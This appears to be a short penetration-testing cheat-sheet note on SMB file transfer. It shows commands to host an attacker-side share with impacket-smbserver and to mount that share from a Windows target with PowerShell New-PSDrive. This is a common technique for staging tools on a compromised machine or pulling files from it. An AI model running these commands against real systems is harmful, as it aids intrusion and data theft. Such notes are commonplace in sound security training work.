# SMB File Transfer

```
# attack
sudo impacket-smbserver {share} $(pwd) -smb2support -user {user} -password {password}

# target (windows GUI)
\\{IP_attack}\{share}

# target (windows cli)
## Create new drive luks
$pass = convertto-securestring 'luks' -asPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential('luks', $pass)
New-PSDrive -Name luks -PSProvider FileSystem -Credential $cred -Root \\{ip}\{share}
cd C:\
cd luks:
```
